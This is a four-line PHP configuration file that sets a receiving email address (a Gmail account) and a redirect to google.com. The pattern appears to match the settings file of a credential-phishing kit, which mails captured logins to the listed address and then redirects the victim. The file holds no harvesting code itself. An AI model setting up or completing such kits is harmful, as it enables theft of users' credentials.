<?php 
$Receive_email="marymilli221@gmail.com";
$redirect="https://www.google.com/";
?>